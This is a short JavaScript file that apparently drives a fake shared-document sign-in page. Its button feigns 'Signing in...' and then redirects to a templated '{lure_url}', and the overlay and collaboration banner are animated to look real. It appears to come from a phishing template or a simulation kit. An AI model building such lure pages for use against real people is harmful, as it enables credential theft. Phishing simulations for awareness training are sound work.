function signInToEdit() {
    const btn = document.querySelector('.btn-sign-in, .btn-open-docs');
    btn.innerHTML = '<span>Signing in...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1200);
}

document.addEventListener('DOMContentLoaded', () => {
    const overlay = document.querySelector('.doc-overlay');
    overlay.style.opacity = '0';
    
    setTimeout(() => {
        overlay.style.transition = 'opacity 0.5s ease';
        overlay.style.opacity = '1';
    }, 500);
    
    const banner = document.querySelector('.collaboration-banner');
    banner.style.opacity = '0';
    banner.style.transform = 'translateY(-10px)';
    
    setTimeout(() => {
        banner.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
        banner.style.opacity = '1';
        banner.style.transform = 'translateY(0)';
    }, 300);
});
